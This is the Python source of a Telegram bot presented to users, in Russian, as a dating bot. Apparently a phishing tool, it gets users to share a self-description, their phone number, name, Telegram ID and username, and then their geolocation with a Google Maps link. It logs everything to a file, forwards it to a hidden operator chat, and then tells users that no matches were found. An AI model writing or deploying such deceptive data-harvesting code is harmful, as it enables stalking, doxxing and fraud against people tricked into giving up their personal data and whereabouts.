import telebot
from telebot import types
import time
import random

ID = ''
bot = telebot.TeleBot("")
bot.send_message(ID, '!BOT STARTED!') 
print("Бот запущен!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Привет! {message.from_user.first_name}👋
		Это бот для знакомства!
	Чтобы начать, введите /znak''') 

@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Для начала напишите немного о себе(одним сообщением)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'Полученая информация: {num}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Для того, чтобы использовать бота, зарегестрируйтесь пожалуйста!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "Регистрация прошла успешно!")
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Отправить", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='Отправьте свою геопозицию, для того, чтобы бот нашел ближайших от вас пользователей!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat} 
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, 'Поиск...')
		time.sleep(2)
		bot.send_message(message.chat.id, 'К сожалению в базе не нашлось подходящих пользователей!')
bot.polling()